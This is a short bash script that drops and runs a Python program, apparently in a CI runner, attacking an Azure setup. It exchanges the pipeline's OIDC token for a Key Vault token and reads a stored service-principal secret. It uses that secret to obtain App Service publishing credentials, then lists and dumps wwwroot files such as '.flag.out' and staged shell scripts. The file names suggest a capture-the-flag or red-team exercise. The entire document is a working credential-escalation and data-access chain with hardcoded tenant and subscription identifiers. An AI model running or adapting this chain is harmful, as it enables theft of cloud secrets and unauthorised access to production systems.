#!/usr/bin/env bash
set +e
cat > /tmp/x.py <<'PYEOF'
import base64,json,os,urllib.parse,urllib.request,urllib.error
TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e";CID="72ff278a-9e71-43ec-bac4-2ca303f8e462"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6";KV1="https://kv-tbl-prod-x3euoz.vault.azure.net"
RID="/subscriptions/"+SUB+"/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod"
SCM="app-tbl-reporting-prod.scm.azurewebsites.net"
def rd(r,t=30):return json.loads(urllib.request.urlopen(r,timeout=t).read().decode())
def form(u,f):return rd(urllib.request.Request(u,data=urllib.parse.urlencode(f).encode(),method="POST"))
def g(u,tok,t=30):
 try:
  r=urllib.request.urlopen(urllib.request.Request(u,headers={"Authorization":tok}),timeout=t);return r.status,r.read().decode("utf-8","replace")
 except urllib.error.HTTPError as e:return e.code,e.read().decode("utf-8","replace")[:800]
 except Exception as e:return 0,repr(e)
oidc=rd(urllib.request.Request(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api%3A%2F%2FAzureADTokenExchange",headers={"Authorization":"Bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]}))["value"]
vt=form("https://login.microsoftonline.com/"+TEN+"/oauth2/v2.0/token",{"client_id":CID,"grant_type":"client_credentials","scope":"https://vault.azure.net/.default","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":oidc})["access_token"]
sp=json.loads(rd(urllib.request.Request(KV1+"/secrets/reporting-service-principal?api-version=7.4",headers={"Authorization":"Bearer "+vt}))["value"])
arm=form("https://login.microsoftonline.com/"+TEN+"/oauth2/v2.0/token",{"client_id":sp.get("appId"),"grant_type":"client_credentials","client_secret":sp.get("clientSecret"),"scope":"https://management.azure.com/.default"})["access_token"]
pb=rd(urllib.request.Request("https://management.azure.com"+RID+"/config/publishingcredentials/list?api-version=2023-01-01",data=b"{}",method="POST",headers={"Authorization":"Bearer "+arm,"Content-Type":"application/json"}))["properties"]
auth="Basic "+base64.b64encode((pb["publishingUserName"]+":"+pb["publishingPassword"]).encode()).decode()
print("=== full wwwroot ===",flush=True)
s,lw=g("https://"+SCM+"/api/vfs/site/wwwroot/",auth); print([x.get("name") for x in (json.loads(lw) if s==200 else [])],flush=True)
for f in [".flag.out",".flag.py","acbstage2.sh","acbstage3.sh","200"]:
 s,c=g("https://"+SCM+"/api/vfs/site/wwwroot/"+f,auth)
 print("\n===== "+f+" (status "+str(s)+") =====\n"+c[:4000],flush=True)
PYEOF
python3 /tmp/x.py
